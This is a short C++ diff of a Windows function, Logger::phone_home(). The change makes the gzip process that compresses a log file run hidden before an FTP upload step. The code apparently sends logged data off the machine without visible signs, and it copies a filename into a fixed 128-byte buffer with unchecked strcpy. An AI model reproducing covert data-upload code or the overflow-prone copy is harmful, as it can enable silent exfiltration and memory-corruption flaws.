@@ -116,13 +116,16 @@ bool Logger::phone_home(){
   STARTUPINFO info;
   memset( &info, 0, sizeof(info) );
   info.cb = sizeof(info);
+  // set startupinfo such that gzip will be hidden.
+  info.dwFlags = STARTF_USESHOWWINDOW;
+  info.wShowWindow = SW_HIDE; 
   PROCESS_INFORMATION pinfo;
   char cmd[128];
   strcpy( cmd, ("gzip.exe -9f \"" + this->filename + "\"").c_str() );
   success = CreateProcess( NULL, cmd, NULL, NULL, false,
                            NORMAL_PRIORITY_CLASS, NULL, NULL, &info, &pinfo );
   if( success ){
-    // wait for gzip to complete
+    // wait for gzip process to exit
     WaitForSingleObject( pinfo.hProcess, INFINITE );
 
     // ftp upload
